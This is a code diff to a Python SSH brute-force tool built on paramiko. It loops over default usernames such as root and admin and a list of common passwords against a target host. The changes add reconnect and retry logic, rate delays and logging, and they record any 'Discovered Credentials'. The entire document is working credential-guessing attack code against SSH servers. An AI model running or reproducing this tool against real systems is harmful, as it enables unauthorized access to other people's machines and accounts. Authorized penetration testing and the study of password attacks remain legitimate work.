@@ -7,6 +7,8 @@ import logging
 from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException
 
 logging.basicConfig()
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.DEBUG)
 
 
 class Engine(object):
@@ -15,7 +17,7 @@ class Engine(object):
     target = ''
     userlist = ['root', 'admin', 'ubuntu', 'Administrator']
     passlist = ['password', '123456', 'letmein', 'superman', 'password123']
-    calc_times = []
+    credentials = []
 
     req_time = 0.0
     num_pools = 10
@@ -71,25 +73,44 @@ class Engine(object):
         self.start_time = time.clock()
 
         ssh = self.init_ssh()
+        successful = False
+        max_conn_attempts = 5
+        curr_conn_attempts = 0
 
         for user in self.userlist:
             for pw in self.passlist:
-                try:
-                    logging.debug('Attempting to connect: %s:%s' % (user, pw))
-                    ssh.connect(self.target, username=user, password=pw)
-                except BadHostKeyException:
-                    logging.debug('BadHostException: %s:%s' % (user, pw))
-                    raise
-                except AuthenticationException:
-                    logging.debug('AuthenticationException: %s:%s' % (user, pw))
-                    raise
-                except SSHException:
-                    logging.debug('SSHException: %s:%s' % (user, pw))
-                    raise
+                while not successful:
+                    try:
+                        curr_conn_attempts += 1
+                        ssh.connect(self.target, username=user, password=pw)
+                    except BadHostKeyException:
+                        raise
+                    except AuthenticationException:
+                        logger.info('Failed: %s:%s' % (user, pw))
+                        successful = True
+                    except SSHException:
+                        ssh.close()
+                        ssh = self.init_ssh()
+                        time.sleep(1)
+                        if curr_conn_attempts >= max_conn_attempts:
+                            logger.info('Could not connect to target: %s' % self.target)
+                            return
+                    else:
+                        creds = '%s:%s' % (user, pw)
+                        logger.info('Discovered Credentials: %s' % creds)
+                        self.credentials.append(creds)
+                        successful = True
+
+                    time.sleep(self.req_time)
+
+                successful = False
+                curr_conn_attempts = 0
 
         self.end_time = time.clock()
         total = self.end_time - self.start_time
-        logging.debug('\nTotal Execution Time: %s\n' % total)
+        logger.debug('\nTotal Execution Time: %s\n' % total)
+
+        logger.info('Discovered credentials: %s' % self.credentials)
 
 
 def main(ip_addr, userfile=None, req_time=0.0, passfile=None):
